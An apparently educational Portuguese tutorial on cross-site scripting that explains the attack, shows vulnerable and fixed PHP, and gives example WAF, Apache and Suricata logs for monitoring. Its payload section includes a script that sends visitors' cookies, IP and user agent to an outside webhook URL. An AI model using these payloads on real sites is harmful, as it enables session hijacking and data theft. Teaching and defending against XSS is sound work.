## XSS (Cross-Site Scripting)

- **Link para o Video** https://youtu.be/oB1owyOmlS4

**Como ocorre o ataque?**

**Por que o ataque acontece?**

**Como corrigir?**

**Como monitorar?**

------------------------------------------------------------

- **Como ocorre o ataque?**

O ataque XSS acontece quando um usuário mau intencionado consegue injetar código malicioso (normalmente JavaScript) em uma página da web, explorando uma vulnerabilidade onde a entrada do usuário não é devidamente tratada ou sanitizada. Essa falha permite que o código seja executado no navegador de outras pessoas quando elas visitam a página infectada, levando à violação de segurança.

**Exemplos de códigos maliciosos**

Capturar user agent:
```js
<script>alert(navigator.userAgent);</script>
```

Capturar IP publico:
```js
<script>fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => alert(data.ip)).catch(error => alert('Error:', error));</script>
```

Capturar cookie:
```js
<script>alert(document.cookie);</script>
```

Redirecionar pagina:
```js
<script>
window.location.href = "http://www.google.com";
<script>
```

Captura tudo e mandar para o servidor do atacante:

```js
<script>
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    let ip = data.ip;
    let userAgent = navigator.userAgent;
    let cookie = document.cookie;
    fetch(`https://webhook.site/5b0d3ce1-235a-42cb-8263-99b9a5667e2d?ip=${ip}&userAgent=${userAgent}&cookie=${cookie}`);
  })
  .catch(error => console.log('Error:', error));
</script>
```


- **Por que o ataque acontece?**

O ataque ocorre devido à ausência de sanitização ou filtragem adequada das entradas de dados no código. Muitas vezes, desenvolvedores não preveem ou desconsideram a possibilidade de usuários inserirem código malicioso nas entradas de dados, o que pode resultar em um vetor de ataque XSS.

Codigo vulnerável sem sanitização ou filtragem:

```php

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
   echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';

}
```

- **Como corrigir?**

A prevenção de ataques XSS implica na implementação de práticas de segurança na codificação, que incluem a sanitização de todas as entradas de dados. As entradas devem ser tratadas como não confiáveis por padrão. Métodos de escape, codificação ou uso de listas de permissões podem ser usados para remover ou neutralizar possíveis códigos maliciosos. 

```php

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
   echo '<pre>Hello ' . htmlspecialchars($_GET[ 'name' ]) . '</pre>';
}
```

- **Como monitorar?**

Para monitorar possíveis ataques XSS, é possível monitorar os logs do servidor web para quaisquer atividades suspeitas, como requisições que contenham scripts ou caracteres indesejáveis. Ferramentas como Web Application Firewall (WAF), Sistemas de Detecção de Intrusão (IDS) ou Sistemas de Prevenção de Intrusão (IPS) também podem ser configurados para monitorar o tráfego de rede e gerar alertas quando detectarem padrões de ataques XSS. Além disso, testes regulares de penetração e varreduras de vulnerabilidades podem ajudar a identificar pontos fracos que poderiam ser explorados em ataques XSS.

Exemplo de log CloudFlare:

```JSON
{
  "timestamp": 1629537263711,
  "scheme": "https",
  "host": "www.site-vul.xyz",
  "client": {
    "ip": "192.0.2.1",
    "browser": "Chrome 91.0.4472",
    "deviceType": "desktop"
  },
  "request": {
    "method": "GET",
    "uri": "/form.php?param=<script>alert('xss')</script>",
    "headers": {
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      "cookie": "cookie_informacao",
      "referer": "http://malicious.xyz",
      "origin": "http://malicious.xyz"
    }
  },
  "response": {
    "status": 403,
    "headers": {
      "cf-waf": "cloudflare",
      "cf-ray": "68ae1267cea82927-SEA",
      "content-length": "571"
    }
  },
  "ruleTriggered": {
    "id": "100601",
    "description": "Cross Site Scripting (XSS) Attempt Detected",
    "action": "block"
  }
}
```

Log Apache:

```apache
192.0.2.1 - - [31/Jul/2023:07:24:32 -0300] "GET /DVWA/dvwa/images/logo.png HTTP/1.1" 304 249 "http://localhost/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

Log do Suricata:
```json
{
  "timestamp": "2023-07-31T14:42:15.145279+0000",
  "flow_id": 1532726509421548,
  "in_iface": "eth0",
  "event_type": "alert",
  "src_ip": "192.0.2.1",
  "src_port": 51820,
  "dest_ip": "203.0.113.7",
  "dest_port": 80,
  "proto": "TCP",
  "http": {
    "hostname": "www.site-vul.xyz",
    "url": "/form.php",
    "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 403,
    "length": 571
  },
  "alert": {
    "action": "blocked",
    "gid": 1,
    "signature_id": 1,
    "rev": 1,
    "signature": "ET WEB_SPECIFIC_APPS Cross Site Scripting Attempt",
    "category": "Attempted User Privilege Gain",
    "severity": 1
  },
  "payload": "<script>alert('xss');</script>",
  "payload_printable": "<script>alert('xss');</script>",
  "stream": 0
}
```
